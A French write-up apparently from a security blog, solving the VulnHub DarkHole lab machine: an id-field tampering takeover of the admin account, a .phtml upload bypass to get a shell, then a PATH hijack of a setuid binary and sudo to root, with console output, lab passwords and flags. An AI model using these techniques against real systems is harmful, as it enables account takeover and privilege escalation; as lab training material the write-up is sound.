---
title: "Solution du CTF DarkHole de VulnHub"
tags: [CTF, VulnHub]
---

Le CTF [DarkHole](https://vulnhub.com/entry/darkhole-1,724/) était simple, mais assez intéressant parce qu'il s'éloignait de l'habituelle faille SQL que l'on trouve sur les challenges. Il y a tellement de failles web existantes alors pourquoi se limiter à une ?

## You are doing it wrong

Sur le port 80 on trouve un site avec une page de login. Il est aussi possible de s'enregistrer donc je m'exécute aussitôt.

Une fois connecté je trouve un formulaire permettant de changer mon mot de passe.

Premier constat : l'ancien mot de passe n'est pas demandé, ce qui en fait un bon candidat à un *Cross Site Request Forgery* mais surtout en regardant le code du formulaire, on voit qu'un champ caché `id` spécifie quel utilisateur est la cible du changement de mot de passe :

```html
<form name="event" method="post">
    <input type="password" name="password" id="ftitle" placeholder="New Password">
    <input type="hidden" name="id" value="2">
    <input type="submit" id="fsubmit" value="Change" class="button">
</form>
```

Il suffit d'éditer la valeur de `id` pour la mettre à `1` via les dev-tools puis de se connecter avec le compte `admin` et le mot de passe que l'on a défini.

On trouve cette fois un formulaire d'upload mais quand on tente d'uploader un fichier avec l'extension `.php` on se fait jeter :

> Sorry , Allow Ex : jpg,png,gif

J'ai d'abord pensé à une whitelist et j'ai donc tenté les doubles extensions (`.php.png`) mais le fichier uploadé n'était pas interprété.

Finalement en utilisant l'extension `.phtml` l'upload fonctionnait correctement, preuve que le script utilisait en fait une blacklist trop permissive.

## Blague de toto

Une fois un shell récupéré je trouve un fichier `config/database.php` à la racine du site :

```php
<?php
$connect = new mysqli("localhost",'john','john','darkhole');
```

Et aussi un fichier `darkhole.sql` dans `/var/www` :

```sql
INSERT INTO `users` (`id`, `username`, `email`, `password`) VALUES
(1, 'admin', 'admin@admin.com', 'EWIOEJIOejw@(#I(@djslKJ');
```

Aucun de ces mots de passe ne semble accepté par le système alors je continue ma route avec les fichiers de l'utilisateur `john` :

```console
www-data@darkhole:/$ find / -user john -ls 2> /dev/null 
   131110      4 drwxrwxrwx   5 john     john         4096 Jul 17  2021 /home/john
   131120      4 -rwxrwx---   1 john     john            1 Jul 17  2021 /home/john/file.py
   131121      4 -rw-rw----   1 john     john           24 Jul 17  2021 /home/john/user.txt
   131114      4 -rw-------   1 john     john           37 Jul 17  2021 /home/john/.mysql_history
   131122      4 drwxrwx---   2 john     www-data     4096 Jul 17  2021 /home/john/.ssh
   131123      4 -rw-------   1 john     www-data     2602 Jul 17  2021 /home/john/.ssh/id_rsa
   131125      4 -rw-r--r--   1 john     www-data      222 Jul 17  2021 /home/john/.ssh/known_hosts
   131124      4 -rw-r--r--   1 john     www-data      567 Jul 17  2021 /home/john/.ssh/id_rsa.pub
   131131      4 -rwxrwx---   1 john     john            8 Jul 17  2021 /home/john/password
   131128      4 -rw-------   1 john     john         1722 Jul 17  2021 /home/john/.bash_history
   131111      4 -rw-r--r--   1 john     john          807 Jul 16  2021 /home/john/.profile
   131126      4 drwx------   2 john     john         4096 Jul 17  2021 /home/john/.cache
   131112      4 -rw-r--r--   1 john     john          220 Jul 16  2021 /home/john/.bash_logout
   131113      4 -rw-r--r--   1 john     john         3771 Jul 16  2021 /home/john/.bashrc
   131115      4 drwxrwxr-x   3 john     john         4096 Jul 17  2021 /home/john/.local
   131116      4 drwx------   3 john     john         4096 Jul 17  2021 /home/john/.local/share
```

Les permissions sur le dossier de `john` et son `.ssh` sont intéressantes. J'ai créé un fichier `authorized_keys` contenant ma clé publique SSH mais le serveur SSH continuait à demander un mot de passe...

Finalement en regardant dans le dossier de l'utilisateur il y avait aussi un fichier ne lui appartenant pas :

```
-rwsr-xr-x 1 root root      17K Jul 17  2021 toto
```

C'est un binaire setuid et une analyze rapide avec `gdb` montre qu'il fait un `setuid` pour un utilisateur différent de `root` et exécute la commande `id` :

```nasm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000001189 <+0>:     endbr64 
   0x000000000000118d <+4>:     push   rbp
   0x000000000000118e <+5>:     mov    rbp,rsp
   0x0000000000001191 <+8>:     mov    edi,0x3e9
   0x0000000000001196 <+13>:    call   0x1090 <setuid@plt>
   0x000000000000119b <+18>:    mov    edi,0x3e9
   0x00000000000011a0 <+23>:    call   0x1080 <setgid@plt>
   0x00000000000011a5 <+28>:    lea    rdi,[rip+0xe58]        # 0x2004
   0x00000000000011ac <+35>:    mov    eax,0x0
   0x00000000000011b1 <+40>:    call   0x1070 <system@plt>
   0x00000000000011b6 <+45>:    nop
   0x00000000000011b7 <+46>:    pop    rbp
   0x00000000000011b8 <+47>:    ret    
End of assembler dump.
gdb-peda$ x/s 0x2004
0x2004: "id"
```

En l'occurrence l'UID est celui de `John` :

```console
www-data@darkhole:/home/john$ ./toto 
uid=1001(john) gid=33(www-data) groups=33(www-data)
```

Il suffit de placer un `dash` sous le nom `id` dans le dossier courant et d'appeler l'exécutable avec le `PATH` modifié :

```console
www-data@darkhole:/home/john$ PATH=.:$PATH ./toto 
$ whoami
john
$ cat user.txt
DarkHole{You_Can_DO_It}
$ cat password
root123
```

Ce mot de passe permet de se connecter avec l'utilisateur `darkhole`, membre du groupe `sudo` :

```console
$ su darkhole
Password: 
darkhole@darkhole:/home/john$ sudo -l
[sudo] password for darkhole: 
Matching Defaults entries for darkhole on darkhole:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User darkhole may run the following commands on darkhole:
    (ALL : ALL) ALL
darkhole@darkhole:/home/john$ sudo su
root@darkhole:/home/john# cd /root
root@darkhole:~# ls
root.txt  snap
root@darkhole:~# cat root.txt
DarkHole{You_Are_Legend}
```


